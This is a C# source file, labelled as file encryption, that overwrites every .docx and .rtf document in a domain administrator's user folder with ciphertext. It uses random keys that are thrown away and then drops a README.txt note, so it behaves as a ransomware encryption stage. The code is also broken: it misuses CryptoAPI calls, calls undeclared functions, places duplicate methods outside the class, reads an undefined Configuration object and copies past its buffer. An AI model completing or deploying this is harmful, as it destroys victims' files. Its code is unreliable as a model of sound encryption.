using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace FileEncryption
{
    public static class FileEncryptor
    {
        private const int AES_KEY_SIZE = 128;
        private const int FILE_MAP_ALL_ACCESS = 0xF001F;
        private const uint CRYPT_MODE_ECB = 0x01;
        private const uint CRYPT_ENCRYPT = 0x01;

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool final, uint dwFlags, byte[] pbData, ref int pdwDataLen, int dwBufLen);

        public static void EncryptFiles()
        {
            string directoryPath = @"C:\Users\domain.admin";

            string[] docxFiles = Directory.GetFiles(directoryPath, "*.docx");
            string[] rtfFiles = Directory.GetFiles(directoryPath, "*.rtf");

            foreach (string file in docxFiles)
            {
                EncryptFileContents(file);
            }

            foreach (string file in rtfFiles)
            {
                EncryptFileContents(file);
            }

            WriteReadmeFile();
        }

        private static void EncryptFileContents(string filePath)
        {
            using (FileStream fs = File.Open(filePath, FileMode.Open, FileAccess.ReadWrite))
            {
                using (MemoryMappedFile mmf = MemoryMappedFile.CreateFromFile(fs, null, 0, MemoryMappedFileAccess.ReadWrite, null, HandleInheritability.None, true))
                {
                    using (MemoryMappedViewStream stream = mmf.CreateViewStream(0, 0, MemoryMappedFileAccess.ReadWrite))
                    {
                        byte[] buffer = new byte[stream.Length];
                        stream.Read(buffer, 0, buffer.Length);

                        EncryptData(ref buffer);

                        stream.Seek(0, SeekOrigin.Begin);
                        stream.Write(buffer, 0, buffer.Length);
                    }
                }
            }
        }

        private static void EncryptData(ref byte[] data)
        {
            byte[] key = GenerateRandomKey();

            IntPtr hCryptProv = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;

            try
            {
                if (!CryptAcquireContext(ref hCryptProv, null, null, 1, 0))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }

                if (!CryptCreateHash(hCryptProv, 0x00008001, IntPtr.Zero, 0, ref hKey))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }

                if (!CryptSetKeyParam(hKey, 0x00000010, key, 0))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }

                int dataSize = data.Length;
                if (!CryptEncrypt(hKey, IntPtr.Zero, true, CRYPT_ENCRYPT, data, ref dataSize, dataSize))
                {
                    throw new CryptographicException(Marshal.GetLastWin32Error());
                }
            }
            finally
            {
                if (hKey != IntPtr.Zero)
                {
                    CryptDestroyKey(hKey);
                }

                if (hCryptProv != IntPtr.Zero)
                {
                    CryptReleaseContext(hCryptProv, 0);
                }
            }
        }
            private static byte[] GenerateRandomKey()
    {
        using (Aes aes = Aes.Create())
        {
            aes.KeySize = AES_KEY_SIZE;
            aes.GenerateKey();
            return aes.Key;
        }
    }
    private static void WriteReadmeFile()
    {
        string readmeFilePath = @"C:\README.txt";
        string content = "done";
        File.WriteAllText(readmeFilePath, content);
    }

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptCreateHash(IntPtr hProv, uint algId, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptSetKeyParam(IntPtr hKey, uint dwParam, byte[] pbData, uint dwFlags);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptDestroyKey(IntPtr hKey);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);
}
}

private static void EncryptFileContents(string filePath)
{
    byte[] encryptedData;
    
    using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.ReadWrite))
    {
        byte[] buffer = new byte[fileStream.Length];
        fileStream.Read(buffer, 0, buffer.Length);
        
        EncryptData(ref buffer);
        
        encryptedData = buffer;
    }
    
    using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write))
    {
        fileStream.Write(encryptedData, 0, encryptedData.Length);
    }
}

private static void EncryptData(ref byte[] data)
{
    string aesKey = Configuration["AesKey"];

    if (string.IsNullOrEmpty(aesKey))
    {
        using (Aes aes = Aes.Create())
        {
            aes.KeySize = AES_KEY_SIZE;
            aes.GenerateKey();

            aesKey = Convert.ToBase64String(aes.Key);
            Configuration["AesKey"] = aesKey;
        }
    }

    byte[] keyBytes = Convert.FromBase64String(aesKey);

    using (AesCryptoServiceProvider aesCryptoProvider = new AesCryptoServiceProvider())
    {
        aesCryptoProvider.Key = keyBytes;

        using (ICryptoTransform encryptor = aesCryptoProvider.CreateEncryptor())
        {
            byte[] encryptedData = encryptor.TransformFinalBlock(data, 0, data.Length);
            Array.Copy(encryptedData, data, encryptedData.Length);
        }
    }
}
